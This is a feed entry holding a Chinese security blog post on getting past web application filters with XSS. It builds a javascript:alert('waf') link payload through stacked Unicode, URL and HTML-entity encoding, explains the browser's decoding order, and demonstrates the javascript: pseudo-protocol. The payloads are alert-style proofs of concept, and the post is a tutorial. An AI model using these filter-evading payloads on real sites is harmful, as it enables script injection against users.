    <title>xss-javascript</title>
    <link href="https://www.wafer.org.cn/2019/11/15/xss%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/"/>
    <id>https://www.wafer.org.cn/2019/11/15/xss%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/</id>
    <published>2019-11-15T08:21:45.360Z</published>
    <updated>2020-03-18T16:20:44.290Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-javascript"><a href="#xss-javascript" class="headerlink" title="xss-javascript"></a>xss-javascript</h1><p><img data-src="/2019/11/15/xss%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/1.png" alt="1.png"><br><img data-src="/2019/11/15/xss%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/2.png" alt="2.png"><br> 这个是某一位师傅博客写的文章,一不小心xss产生<br> <a id="more"></a></p><h2 id="xss-javascript编码绕过"><a href="#xss-javascript编码绕过" class="headerlink" title="xss-javascript编码绕过"></a>xss-javascript编码绕过</h2><p>原始payload</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">javascript</span>:<span class="function"><span class="title">alert</span>(<span class="string">'waf'</span>)</span></span><br></pre></td></tr></table></figure><p>alert经过unicode编码后</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">\u</span>0061<span class="symbol">\u</span>006c<span class="symbol">\u</span>0065<span class="symbol">\u</span>0072<span class="symbol">\u</span>0074</span><br></pre></td></tr></table></figure><p>alert经过url编码后</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%75</span><span class="symbol">%30</span><span class="symbol">%30</span><span class="symbol">%36</span><span class="symbol">%31</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%75</span><span class="symbol">%30</span><span class="symbol">%30</span><span class="symbol">%36</span><span class="symbol">%63</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%75</span><span class="symbol">%30</span><span class="symbol">%30</span><span class="symbol">%36</span><span class="symbol">%35</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%75</span><span class="symbol">%30</span><span class="symbol">%30</span><span class="symbol">%37</span><span class="symbol">%32</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%75</span><span class="symbol">%30</span><span class="symbol">%30</span><span class="symbol">%37</span><span class="symbol">%34</span></span><br></pre></td></tr></table></figure><p>最后在html编码全部</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"<span class="symbol">&amp;#106;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#118;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#105;</span><span class="symbol">&amp;#112;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#58;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#55;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#54;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#49;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#55;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#54;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#54;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#55;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#54;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#55;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#55;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#50;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#99;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#55;</span><span class="symbol">&amp;#53;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#48;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#55;</span><span class="symbol">&amp;#37;</span><span class="symbol">&amp;#51;</span><span class="symbol">&amp;#52;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#119;</span><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#102;</span><span class="symbol">&amp;#39;</span><span class="symbol">&amp;#41;</span>"</span>&gt;</span>waf<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最后payload编译过程</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">payload</span>-&gt;</span><span class="function"><span class="title">unicode</span>编码处理-&gt;</span><span class="function"><span class="title">url</span>编码处理-&gt;</span>html编码处理</span><br></pre></td></tr></table></figure><p>最终构造成xss paylaod</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('waf')"</span>&gt;</span>waf<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>解码过程</p><p>先是html解析器进行解析,在解析完后url解析器在进行解析,进行url解码,最重要的来了由于javascript协议,他本身引擎会对unicode编码的字符串进行解码,最终变为原始payload.<br>顺便提一句这个编码过程在360杯复赛签到题就是经过这三种编码后的flag.</p><p>上面提到了javascript,现在我们来理解下什么是javacript<br>javascript:伪协议<br>我们可以在浏览地址栏里输入”javascript:alert(‘waf’);”,点转到后会发现,实际上是把javascript:后面的代码当JavaScript来执行,并将结果值返回给当前页面<br>类似,我们可以在a标签的href属性中使用javascript伪协议</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">a</span> href=<span class="string">"javascript:alert('waf');"</span>&gt;&lt;/<span class="keyword">a</span>&gt;<span class="comment"> //点击这面的链接,浏览器并不会跳转到任何页面,而是显示一个弹窗,值为waf.</span></span><br></pre></td></tr></table></figure><p>但javascript:伪协议有个问题,它会将执行结果返回给当然的页面</p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href="javascript:window.prompt(<span class="string">'waf come here'</span>,<span class="string">''</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;xss-javascript&quot;&gt;&lt;a href=&quot;#xss-javascript&quot; class=&quot;headerlink&quot; title=&quot;xss-javascript&quot;&gt;&lt;/a&gt;xss-javascript&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2019/11/15/xss%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/1.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;&lt;img src=&quot;/2019/11/15/xss%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/2.png&quot; alt=&quot;2.png&quot;&gt;&lt;br&gt; 这个是某一位师傅博客写的文章,一不小心xss产生&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
